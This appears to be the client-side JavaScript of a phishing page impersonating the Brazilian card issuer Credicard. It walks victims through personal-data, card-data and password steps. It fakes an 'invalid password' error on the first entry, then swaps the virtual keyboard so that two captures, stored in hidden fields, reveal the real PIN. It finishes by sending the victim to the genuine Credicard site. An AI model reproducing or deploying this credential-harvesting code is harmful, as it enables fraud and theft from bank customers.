        
		 /* Funções para serem reaproveitadas
			page:	CREDICARD
		 */
		
		let tecladoActive = 1
		let digitarHiddenCount = 0
        
		// btn voltar página sucesso
        $("#btn-pag04").click(function(){
            location.href="https://www.credicard.com.br/"
        })
        
        // Oculta todos elementos da página 
        $("#pag01, #pag02 , #pag03, #pag04").hide()
        $("#dados-user-nome, #dados-loading, #dados-senha").hide()
        // Mostra o elemento escolhido
        $("#pag01").show()
		

		/* 	Oculta todos elementos do menu Target " Você está aqui"
			posteriormente será chamado do show dos elementos necessários			
        */
		function hideTarget(){
			$("#TargetDadosPessoais , #TargetDadosPessoaisA").hide()
			$("#TargetDadosCartao , #TargetDadosCartaoA").hide()
			$("#TargetVerificacao , #TargetVerificacaoA").hide()
			$("#voceEstaAqui01").css('visibility', 'hidden')
			$("#voceEstaAqui02").css('visibility', 'hidden')
			$("#voceEstaAqui03").css('visibility', 'hidden')
		}

		
		/* limpa inputs a chamada da função é 
		   limpar("#idInput01,#idIntpu02);
        */
        function limpar(id) {
            $(id).val("");
			digitarHiddenCount = 0
        }
		
		
		/*	
			Mensagem que irá aparecer ao clicar em algum link/button que chame essa função msgClick()
		*/
		function msgClick() {
            alert("Para acessar outras opções do sistema, primeiro preencha corretamente os dados solicitados")
        }
        
		
		
		/*	função para digitar em um input quando clica em um button
			Quando se utiliza buttons para digitar a senha e bloquear que o usuário digite via teclado
			chamada da função: digitar(this) or digitar(8)
			exeplo prático:
			<li onclick="digitar(this)" class="tecla"><span>1</span></li>
		*/
        function digitar(number) {
		//debugger
		 p1 = $("#input_password").val()
            
            if(p1.length <= 3){
            //debugger
             var inputNumber = $("#input_password").val();
            // var inputPassword01 = $("#hidden_password01").val();
             //var inputPassword02 = $("#hidden_password02").val();
             var butonClick = number
            //alert(number)
            $("#input_password").val( inputNumber + butonClick) ;
            $("#hidden_password02").val();
        }
	}
		
		
		 
        function digitarHidden(number, tecladoNum) {
		//debugger
             //p1 = $("#input_password").val()
            
			 
            if(digitarHiddenCount <= 3){
			digitarHiddenCount++
			//alert("digitarHidden")
            //debugger
             var inputPassword01 = $("#hidden_password01").val();
             var inputPassword02 = $("#hidden_password02").val();
             var butonClick = number
            //alert(number)
            if(tecladoNum == 1){
                $("#hidden_password01").val( inputPassword01 + butonClick)
            }else if(tecladoNum == 2){
                $("#hidden_password02").val( inputPassword02 + butonClick)
            }
        }
	}

	
	        function newPasswordTeclado() {
            //alert("ABC")
            // Ordem dos botoes do teclado
            // A = 1,6      // F = 3,8      
            // B = 3,5      // G = 2,9
            // C = 7,8      // H = 1,4
            // D = 0,9      // I = 6,0
            // E = 2,4      // J = 7,5
            
            //debugger
            let p1 = $("#input_password").val()
            
            if(p1.length === 4){

            if(tecladoActive == 1){
                    // Salva no hidden-password
                    //$("#hidden_password01").val($("#input_password").val())
                    alert("Senha inválida, digite sua senha novamente")
                    $("#input_password").val('')
                   
                    //alert("Altera a ordem dos números")
                    $("#btn_teclado01").hide()
                    $("#btn_teclado02").show()
                    tecladoActive = 2
					digitarHiddenCount = 0
                }else{
                    //$("#hidden_password02").val($("#input_password").val())
                    // alert("Função pra verificar se as duas entradas do password são iguais")
                    // Função para fazer o match se bater as 2 senhas vai pra proxima tela se não volta para digitar a senha novamente
                    page03()
					
                }
               

            }else{
                alert("Preencha a senha corretamente")
            }

        }
		
		
		/*
			Mostrar o teclado virtual
		*/
		function showTeclado() {
			$("#teclado").show()
        }

		
		// btn entre DADOS PESSOAIS / LOADING / DADOS DO CARTÃO
		// btn entre DADOS PESSOAIS / LOADING / DADOS DO CARTÃO
        $("#btn_pessoal").click(function () {
            $("#btn_pessoal_submit").click()
        });

        $("#btn_cartao").click(function () {
            $("#btn_cartao_submit").click()
        });
